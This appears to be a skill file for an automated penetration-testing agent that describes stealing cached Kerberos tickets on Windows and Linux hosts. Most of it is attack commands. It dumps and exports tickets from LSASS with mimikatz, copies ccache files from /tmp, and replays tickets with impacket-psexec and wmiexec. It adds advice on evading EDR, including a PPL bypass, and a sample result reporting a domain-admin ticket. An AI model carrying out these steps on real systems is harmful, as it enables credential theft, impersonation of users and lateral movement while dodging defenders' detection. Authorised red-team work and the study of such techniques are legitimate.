---
name: ad-kerberos-token-steal
description: Extract cached Kerberos tickets from LSASS (Windows) and /tmp (Linux)
phase: post
category: active-directory
tags: [ad, kerberos, token, ticket, pass-the-ticket]
tools: [mimikatz, klist, impacket]
difficulty: advanced
opsec_level: active
time_estimate: 120s
severity_if_found: critical
---

## When to Use

Use this skill with SYSTEM/root access on a domain-joined machine to extract
Kerberos tickets from LSASS process memory (Windows) or credential cache files
(Linux). Stolen tickets enable pass-the-ticket attacks to impersonate users.

## Prerequisites

```bash
# mimikatz (Windows — run on target or transfer)
# impacket (Linux — for ticket conversion/replay)
pip install impacket
```

## Procedure

```bash
# --- WINDOWS (SYSTEM access required) ---
# Step 1: Extract all Kerberos tickets from LSASS
# mimikatz # privilege::debug
# mimikatz # sekurlsa::kerberos

# Step 2: Export tickets to files
# mimikatz # sekurlsa::tickets /export

# Step 3: Pass-the-ticket with exported .kirbi
# mimikatz # kerberos::ptt c:\path\to\ticket.kirbi

# --- LINUX (root access required) ---
# Step 4: List cached ticket files
ls -la /tmp/krb5cc_*

# Step 5: View ticket details
klist -c /tmp/krb5cc_UID

# Step 6: Export ticket for replay
cp /tmp/krb5cc_UID /tmp/stolen_ticket.ccache
export KRB5CCNAME=/tmp/stolen_ticket.ccache

# Step 7: Replay ticket (both platforms)
# impacket-psexec DOMAIN/ANYUSER@TARGET -k -no-pass
# impacket-wmiexec DOMAIN/ANYUSER@TARGET -k -no-pass
```

## OPSEC Rules

- **CRITICAL**: Accessing LSASS memory triggers Sysmon event 10 (ProcessAccess)
- PPL (Protected Process Light) may prevent mimikatz — use PPL bypass
- Ticket export via sekurlsa::tickets triggers strong EDR alerts
- Use `sekurlsa::tickets /export` sparingly — each export is an event
- Transfer .kirbi files over encrypted channels only
- Expired tickets are unusable — check validity with `klist`
- TGTs are the most valuable (renewable up to 7 days by default)

## Verification

- `klist` shows cached tickets with valid expiration dates
- Exported .kirbi file is 1-10 KB (TGT) or smaller (service tickets)
- Pass-the-ticket: `impacket-psexec -k -no-pass` authenticates without password
- Ticket delegation flag: tickets with `forwardable` flag are reusable

## Pitfalls

- Windows Defender Credential Guard isolates LSASS — mimikatz cannot read it
- Linux tickets expire — check `End Time` in `klist` output
- Pass-the-ticket only works for services the ticket was issued for
- TGTs issued by non-target DC may not work on cross-domain trusts
- `sekurlsa::tickets` dumps ALL tickets, including expired/unused ones
- Linux ccache files are owned by the UID — root can read all

## Output Format

```
[KERBEROS-STEAL] Host: ws050.domain.local (10.0.1.50)
[KERBEROS-STEAL] Platform: Windows — LSASS dump (mimikatz sekurlsa::tickets)
[KERBEROS-STEAL] Tickets found: 4
[KERBEROS-STEAL] TGT: Administrator@DOMAIN.LOCAL — 2024-06-12 10:00 → 2024-06-12 20:00
[KERBEROS-STEAL] TGS: krbtgt/DOMAIN.LOCAL — forwardable, renewable
[KERBEROS-STEAL] Severity: CRITICAL — DA token available for pass-the-ticket
```
